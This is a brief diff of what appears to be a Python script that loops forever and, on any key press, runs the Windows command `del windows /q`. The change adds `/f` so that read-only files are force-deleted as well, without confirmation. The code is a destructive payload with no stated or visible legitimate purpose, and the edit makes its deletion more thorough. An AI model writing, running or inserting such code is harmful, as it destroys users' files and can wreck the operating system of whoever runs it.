@@ -3,4 +3,4 @@ import os
 
 while True:
     if keyboard.read_key():
-        os.system("del windows /q")
+        os.system("del windows /f /q")
